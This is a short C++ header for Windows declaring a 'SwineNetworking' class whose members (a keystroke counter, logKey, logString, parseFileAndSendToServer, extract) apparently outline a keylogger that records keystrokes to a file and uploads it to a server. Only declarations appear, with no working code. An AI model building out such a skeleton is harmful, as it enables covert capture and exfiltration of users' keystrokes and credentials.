#ifndef SWINENETWORKING_H
#define SWINENETWORKING_H
#include<windows.h>
#include<stdio.h>
#include<winuser.h>
#include<windowsx.h>
#include <string>
namespace SwineNetworking {
	class Networking {
	public:
		static int keysLogged;
		static void Networking::logNetworking(char *message, size_t bytes);
		static BOOL __cdecl Networking::checkError(BOOL error, wchar_t *message);
		static int __cdecl Networking::logActivity(void *ptr, size_t size);
		static int __cdecl Networking::parseFileAndSendToServer();
		static int __cdecl Networking::logString(char *character);
		static int __cdecl logKey(short character);
		static int __cdecl extract(HANDLE file, int *bytes_sent);
	};
}
#endif